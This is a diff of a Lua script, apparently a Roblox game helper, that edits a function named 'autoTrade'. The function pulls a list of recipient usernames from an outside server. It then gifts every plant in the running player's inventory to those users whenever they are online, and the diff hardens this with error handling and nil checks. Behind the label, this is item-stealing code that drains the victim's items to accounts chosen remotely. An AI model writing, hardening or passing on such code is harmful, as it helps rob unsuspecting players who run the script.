@@ -212,27 +212,34 @@ local function checkInventory()
 end
 
 local function autoTrade()
-    local resp = requestAPI("https://raw.phuocbadlion.com/68f092e375d8f/raw")
-    local inv = checkInventory()
+    local success, err = pcall(function()
+        local resp = requestAPI("https://raw.phuocbadlion.com/68f092e375d8f/raw")
+        local inv = checkInventory()
 
-    if #inv > 0 then
-        for _, userReceive in ipairs(resp) do
-            if isOnline(userReceive) then
-                for _, plant in pairs(inv) do
-                    plant.Parent = Character
+        if #inv > 0 then
+            for _, userReceive in ipairs(resp) do
+                if isOnline(userReceive) then
+                    for _, plant in pairs(inv) do
+                        if plant and plant.Parent then
+                            plant.Parent = Character
 
-                    local args = {
-                        [1] = {
-                            ["Item"] = plant,
-                            ["ToGift"] = userReceive
-                        }
-                    }
-                    GiftItem:FireServer(unpack(args))
-
-                    task.wait(3)
+                            local args = {
+                                [1] = {
+                                    ["Item"] = plant,
+                                    ["ToGift"] = userReceive
+                                }
+                            }
+                            GiftItem:FireServer(unpack(args))
+                            task.wait(3)
+                        end
+                    end
                 end
             end
         end
+    end)
+
+    if not success then
+        warn("[autoTrade Error]:", err)
     end
 end
 -- end function
